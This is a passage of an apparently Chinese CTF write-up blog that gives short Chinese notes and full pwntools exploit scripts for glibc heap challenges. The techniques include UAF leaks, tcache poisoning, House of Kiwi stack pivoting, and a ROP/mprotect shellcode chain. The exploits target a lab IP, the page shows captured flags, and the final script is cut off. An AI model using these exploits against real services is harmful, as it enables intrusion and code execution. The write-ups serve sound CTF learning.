class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;192.168.166.147&#x27;</span>,<span class="hljs-number">58013</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    menu(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data,size=<span class="hljs-number">0x100</span></span>):<br>    menu(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&#x27;Content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><br>add()<br>dele(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>heap_leak = uu64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>))<br>heap_base = heap_leak &lt;&lt;<span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add() <span class="hljs-comment"># 9</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>+<span class="hljs-number">8</span>):<br>    dele(i)<br>show(<span class="hljs-number">8</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1f2cc0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br><br>stderr = libc_base + <span class="hljs-number">0x1f3680</span><br>helper = libc_base + <span class="hljs-number">0x1f45c0</span><br><br>edit(<span class="hljs-number">7</span>,p64(heap_leak^(heap_base+<span class="hljs-number">0x100</span>)))<br>add() <span class="hljs-comment"># 11</span><br><span class="hljs-comment"># pause()</span><br>add() <span class="hljs-comment"># 12</span><br>edit(<span class="hljs-number">12</span>,p64(stderr)*<span class="hljs-number">2</span>)<br>lg(<span class="hljs-string">&#x27;ADDR&#x27;</span>,(heap_base+<span class="hljs-number">0x100</span>))<br>add() <span class="hljs-comment"># 13</span><br>edit(<span class="hljs-number">13</span>,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>)<br>edit(<span class="hljs-number">12</span>,p64(helper)*<span class="hljs-number">2</span>)<br>add()<br>edit(<span class="hljs-number">14</span>,p64(system_addr))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    edit(<span class="hljs-number">12</span>,p64(heap_base+<span class="hljs-number">0xd30</span>)*<span class="hljs-number">2</span>)<br>    add()<br>    edit(<span class="hljs-number">15</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br><br>add()<br>add()<br>add()<br><br><span class="hljs-comment"># add()</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="bigduck"><a class="header-anchor" href="#bigduck">¶</a>bigduck</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220619194814107.png" alt="image-20220619194814107"></p><p><strong>flag{afae47ead2452a4b5ba629ec88635a51}</strong></p><p>libc 2.33 下开了沙盒的堆题，其他部分和上题一样。</p><p><strong>思路</strong></p><ol><li>利用 UAF leak 堆地址，分配并 Dele 掉多个堆块 leak libc</li><li>分配 chunk 到 Tcache 的 entry 处，利用 Edit 函数我们可以控制任意分配堆块</li><li>House of kiwi 完成栈迁移，执行 shellcode 读取 flag</li></ol><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;192.168.166.147&#x27;</span>,<span class="hljs-number">58011</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    menu(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data,size=<span class="hljs-number">0x100</span></span>):<br>    menu(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&#x27;Content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><br>add()<br>dele(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>heap_leak = uu64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>))<br>heap_base = heap_leak &lt;&lt;<span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add() <span class="hljs-comment"># 9</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>+<span class="hljs-number">8</span>):<br>    dele(i)<br>edit(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;u&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1e0c75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>edit(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br><br>stderr = libc_base + <span class="hljs-number">0x1f3680</span><br>sync = libc_base + <span class="hljs-number">0x1e24a0</span> + <span class="hljs-number">0x60</span><br>magic = libc_base + <span class="hljs-number">0x529ad</span><br>helper = libc_base + <span class="hljs-number">0x1e1940</span><br>ret = libc_base + <span class="hljs-number">0x0000000000026699</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>rdx = libc_base + <span class="hljs-number">0x00000000000c7f32</span><br>addr = heap_base + <span class="hljs-number">0x400</span><br><br>mmp = flat([<br>    <span class="hljs-number">0</span>,rdi,((addr)&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span>,rsi,<span class="hljs-number">0x2000</span>,rdx,<span class="hljs-number">7</span>,libc.sym.mprotect,rdi,<span class="hljs-number">0</span>,rsi,addr+<span class="hljs-number">0x400</span>,rdx,<span class="hljs-number">0x100</span>,libc.sym.read,libc_base + <span class="hljs-number">0x00000000000506b1</span><br>])<br><br>edit(<span class="hljs-number">0</span>,mmp)<br><span class="hljs-comment"># edit(1,mmp)</span><br><br>edit(<span class="hljs-number">7</span>,p64(heap_leak^(heap_base+<span class="hljs-number">0x100</span>)))<br>add() <span class="hljs-comment"># 11</span><br><span class="hljs-comment"># pause()</span><br>add() <span class="hljs-comment"># 12</span><br>edit(<span class="hljs-number">12</span>,p64(helper)*<span class="hljs-number">2</span>)<br>lg(<span class="hljs-string">&#x27;ADDR&#x27;</span>,(heap_base+<span class="hljs-number">0x100</span>))<br>add() <span class="hljs-comment"># 13</span><br>edit(<span class="hljs-number">13</span>,p64(heap_base+<span class="hljs-number">0x2a8</span>)+p64(ret))<br>edit(<span class="hljs-number">12</span>,p64(sync)*<span class="hljs-number">2</span>)<br>add()<br>edit(<span class="hljs-number">14</span>,p64(magic))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    edit(<span class="hljs-number">12</span>,p64(heap_base+<span class="hljs-number">0xd30</span>)*<span class="hljs-number">2</span>)<br>    add()<br>    edit(<span class="hljs-number">15</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br><br>add()<br>add()<br>add()<br><br><span class="hljs-comment"># # add()</span><br>sleep(<span class="hljs-number">2</span>)<br>sl(asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>p.interactive()<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x0000000000028a55 : pop rdi ; ret</span><br><span class="hljs-string">0x0000000000112a51 : pop rdx ; pop r12 ; ret</span><br><span class="hljs-string">0x00000000001574e6 : pop rdx ; pop rbx ; ret</span><br><span class="hljs-string">0x00000000000fc103 : pop rdx ; pop rcx ; pop rbx ; ret</span><br><span class="hljs-string">0x00000000000c7f32 : pop rdx ; ret</span><br><span class="hljs-string">0x0000000000095982 : pop rdx ; ret 0x11</span><br><span class="hljs-string">0x0000000000093342 : pop rdx ; ret 0xfffc</span><br><span class="hljs-string">0x0000000000028db0 : pop rsi ; pop r15 ; pop rbp ; ret</span><br><span class="hljs-string">0x0000000000028a53 : pop rsi ; pop r15 ; ret</span><br><span class="hljs-string">0x000000000002a4cf : pop rsi ; ret</span><br><span class="hljs-string">0x0000000000028dac : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span><br><span class="hljs-string">0x0000000000028a4f : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="hljs-string">0x000000000002a4cb : pop rsp ; pop r13 ; pop r14 ; ret</span><br><span class="hljs-string">0x0000000000043922 : pop rsp ; pop r13 ; pop rbp ; ret</span><br><span class="hljs-string">0x000000000002a04c : pop rsp ; pop r13 ; ret</span><br><span class="hljs-string">0x00000000000de0e6 : pop rsp ; pop rbp ; ret</span><br><span class="hljs-string">0x0000000000033af2 : pop rsp ; ret</span><br><span class="hljs-string">0x0000000000026699 : ret</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="blue"><a class="header-anchor" href="#blue">¶</a>blue</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220619194659319.png" alt="image-20220619194659319"></p><p><strong>flag{8c65b8bd2169f2cf662ae9e324aaef66}</strong></p><p>Ubuntu GLIBC 2.31-0ubuntu9.8 的堆题，IO jumps 段不可写，没有办法按传统思路走。</p><p><strong>思路</strong></p><ol><li>利用后门函数，类似 House of botcake 的手法完成堆块重叠的同时 leak 出 libc。</li><li>攻击 Stdout Leak 栈地址</li><li>塞 ROP</li></ol><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br>elf = ELF(<span 